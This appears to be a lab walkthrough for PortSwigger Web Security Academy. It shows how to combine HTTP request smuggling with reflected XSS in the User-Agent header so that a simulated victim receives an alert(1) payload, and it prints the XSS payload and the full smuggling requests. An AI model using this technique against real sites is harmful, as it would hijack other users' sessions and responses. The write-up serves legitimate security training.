# Lab 10 — Exploiting HTTP request smuggling to deliver reflected XSS

> **Scope:** PortSwigger Web Security Academy / authorized lab environment only.

## Objective & Context

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

Notes
Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
> **Tip**
Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Walkthrough

Visit a blog post, and send the request to Burp Repeater.
Observe that the comment form contains your User-Agent header in a hidden input.
Inject an XSS payload into the User-Agent header and observe that it gets reflected:

"/><script>alert(1)</script>
Smuggle this XSS request to the back-end server, so that it exploits the next visitor:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked
```

0

```http
GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
```

x=1
> **Note**
Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
